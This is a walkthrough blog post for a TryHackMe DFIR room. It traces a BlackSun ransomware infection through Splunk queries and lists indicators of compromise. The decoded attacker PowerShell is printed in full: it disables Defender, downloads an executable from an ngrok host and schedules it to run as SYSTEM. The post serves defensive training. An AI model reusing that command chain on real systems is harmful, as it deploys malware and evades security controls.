---
layout: post
title: "TryHackMe: PSEclipse Writeup"
date: 2026-06-07
categories: [Writeups, TryHackMe]
tags: [Splunk, Incident-Response, DFIR, PowerShell, CyberChef]
image: /assets/img/banners/PSEclipse.png
---

## Executive Summary

**PSEclipse** is an interactive Blue Team room on TryHackMe designed to test digital forensics and incident response (DFIR) skills using **Splunk**. This post contains a comprehensive, chronological analysis detailing an adversary's execution chain on a Windows endpoint progressing from an obfuscated PowerShell vector to a privilege-escalated ransomware execution.

---

### Phase 1: Staging & Initial Payload Delivery

The investigation begins by hunting for any anomalous file modifications or dropping behavior in high-risk user workspaces such as temporary and download directories.

#### Q1: A suspicious binary was downloaded to the endpoint. What was the name of the binary?
* **Answer:** `OUTSTANDING_GUTTER.exe`
* **Splunk Search:**
```splunk
  index=* User="DESKTOP-TBV8NEF\\keegan" | search TargetFilename="*\\Downloads\\*" OR TargetFilename="*Temp\\*" | table _time host User Image TargetFilename
  ```
* **Analysis:** Querying file generation events under user `keegan` catches an execution path creating a highly unusual binary inside the path `C:\Windows\Temp\OUTSTANDING_GUTTER.exe`.

  ![Initial Binary Identification](/assets/img/TryHackMe/PSEclipse/binary.png)

---

### Phase 2: Deobfuscating the Access Vector

With the file drop pinpointed, we pivot to investigate the parent process command architecture that initiated the file retrieval request over the network.

#### Q2: What is the address the binary was downloaded from? Add http:// to your answer & defang the URL.
* **Answer:** `http://886e-181-215-214-32[.]ngrok[.]io`
* **Splunk Search:**
```splunk
  index=* User="DESKTOP-TBV8NEF\\keegan" OUTSTANDING_GUTTER.exe | table sort ParentCommandLine
  ```
* **Analysis:** The search tracks down an encoded Base64 block passed to a hidden PowerShell process execution window using the standard `-exec bypass -enc` flags.

  ![Encoded Payload CommandLine](/assets/img/TryHackMe/PSEclipse/download1.png)

#### CyberChef Analysis
By loading the extracted base64 string block into CyberChef and processing it through the **From Base64** recipe and decoding via **UTF-16LE (1200)**, the full network deployment sequence is plain-text exposed:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true;
wget [http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe](/assets/img/TryHackMe/PSEclipse/http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe) -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;
SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\OUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;
SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"
```

  ![CyberChef Decryption Process](/assets/img/TryHackMe/PSEclipse/download2.png)

---

### Phase 3: Analyzing Downloader Mechanisms

To map execution flows, we isolate the specific runtime executable binary used by the operating system layer to evaluate the web download logic.

#### Q3: What Windows executable was used to download the suspicious binary? Enter full path.
* **Answer:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
* **Splunk Search:**
```splunk
  index=* User="DESKTOP-TBV8NEF\\keegan" ParentCommandLine="*powershell.exe*" | table sort ParentImage
  ```
* **Analysis:** Correlating the Sysmon telemetry confirms that native Microsoft core administrative PowerShell frameworks were abused to process the web hook downloads.

  ![Downloader Parent Image Investigation](/assets/img/TryHackMe/PSEclipse/parentimage.png)

---

### Phase 4: Persistence and Privilege Escalation

Once staging completed successfully, the threat actor utilized system configuration tools to construct a persistent administrative backdoor trigger.

#### Q4: What command was executed to configure the suspicious binary to run with elevated privileges?
* **Answer:** `"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\OUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f`
* **Splunk Search:**
```splunk
  index=* User="DESKTOP-TBV8NEF\\keegan" OUTSTANDING_GUTTER.exe | table sort CommandLine
  ```
* **Analysis:** The adversary registered a persistent scheduled task triggered automatically upon standard Application Event Log entries matching EventID `777`, explicitly mapping runtime flags to launch within a SYSTEM context.

  ![Privilege Configuration Command](/assets/img/TryHackMe/PSEclipse/command.png)

---

### Phase 5: High-Integrity Context Verification

Following task setup, the operator explicitly called the scheduled execution pipeline to test execution bounds and ensure absolute machine authority.

#### Q5: What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? (Format: User + ; + CommandLine)
* **Answer:** `NT AUTHORITY\SYSTEM;"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe`
* **Splunk Search:**
```splunk
  index=* OUTSTANDING_GUTTER.exe CommandLine!="" | table User CommandLine
  ```
* **Analysis:** Auditing the executing user parameters validates that the binary processes executed successfully with complete core OS permissions (`NT AUTHORITY\SYSTEM`).

  ![System Permission Execution](/assets/img/TryHackMe/PSEclipse/permissions.png)

---

### Phase 6: Outbound Communication Analysis

With high-privilege execution achieved, the payload initialized network connections to return access handles back to external networks.

#### Q6: The suspicious binary connected to a remote server. What address did it connect to? Add http:// to your answer & defang the URL.
* **Answer:** `http://9030-181-215-214-32[.]ngrok[.]io`
* **Splunk Search:**
```splunk
  index=* Image="C:\\Windows\\Temp\\OUTSTANDING_GUTTER.exe" QueryName!="" | table QueryName
  ```
* **Analysis:** Isolating Sysmon Event ID 22 (DNS Queries) originating directly from the high-privilege process isolates a unique external tracking subdomain hosted across public proxy tunnels (`ngrok.io`).

  ![DNS Comm Link Detection](/assets/img/TryHackMe/PSEclipse/url.png)

---

### Phase 7: Post-Exploitation Script Staging

The network access pipeline was quickly leveraged to transfer further runtime toolsets directly onto the local filesystem workspace.

#### Q7: A PowerShell script was downloaded to the same location as the suspicious binary. What was the name of the file?
* **Answer:** `script.ps1`
* **Splunk Search:**
```splunk
  index=* TargetFilename="C:\\Windows\\Temp\\*ps1" | table User TargetFilename
  ```
* **Analysis:** Reviewing additional file drop history in the local target staging directory confirms the arrival of an un-obfuscated script asset named `script.ps1`.

  ![PowerShell Script Discovery](/assets/img/TryHackMe/PSEclipse/script.png)

---

### Phase 8: Threat Intelligence Alignment

Analyzing the unique cryptographic fingerprint of the newly written script enables security validation against active malware frameworks.

#### Q8: The malicious script was flagged as malicious. What do you think was the actual name of the malicious script?
* **Answer:** `BlackSun.ps1`
* **Analysis:** Querying the SHA256 file fingerprint value (`e5429f2e44990b3d4e249c566fbf1741e671c0e40b809f87248d9ec9114bef9`) across threat intelligence index feeds alerts matching detections from **31/54 security vendors** identifying it explicitly as the **BlackSun** deployment script.

  ![VirusTotal Hash Lookup](/assets/img/TryHackMe/PSEclipse/name.png)

---

### Phase 9: File System Destruction & Mitigation Mapping

The execution of the identified script results in immediate compromise of files, transforming systemic assets and publishing ransom terms locally.

#### Q9: A ransomware note was saved to disk, which can serve as an IOC. What is the full path to which the ransom note was saved?
* **Answer:** `C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt`

#### Q10: The script saved an image file to disk to replace the user's desktop wallpaper, which can also serve as an IOC. What is the full path of the image?
* **Answer:** `C:\Users\Public\Pictures\blacksun.jpg`

* **Splunk Search:**
```splunk
  index=* TargetFilename="*BlackSun*" | table TargetFilename
  ```
* **Analysis:** The indexing run maps massive filesystem alterations files are rewritten using the `.BlackSun` suffix extension while custom visual branding keys and readable instructions are deployed system-wide.

  ![Indicators of Compromise Map](/assets/img/TryHackMe/PSEclipse/IOC.png)

---

## Indicators of Compromise Summary (IOCs)

| Type | Target Asset / Pattern | Context Alignment |
| :--- | :--- | :--- |
| **File Path** | `C:\Windows\Temp\OUTSTANDING_GUTTER.exe` | Staged Malicious Imaged Binary |
| **File Path** | `C:\Windows\Temp\script.ps1` | BlackSun Extrusion Script |
| **URL (Defanged)**| `http://886e-181-215-214-32[.]ngrok[.]io` | Payload Staging Host |
| **URL (Defanged)**| `http://9030-181-215-214-32[.]ngrok[.]io` | Active Interactive Command Tunnel |
| **File Name** | `BlackSun_README.txt` | Core Ransom Instruction Note |
| **File Path** | `C:\Users\Public\Pictures\blacksun.jpg` | Overwritten Workspace Wallpaper Asset |

---

## Conclusion & Defenses

The execution chain analyzed in **PSEclipse** highlights standard post-exploitation methodology:
1. Disabling native defense definitions using local script variables (`Set-MpPreference`).
2. Tunneling secondary malware artifacts inside system spaces via public loopback configurations (`ngrok`).
3. Hijacking administrative OS scheduling mechanisms to maintain privilege scaling.

Ensuring strict app whitelisting, monitoring configuration additions to Scheduled Tasks, and hardening PowerShell group parameters stand as vital controls against similar infection chains.
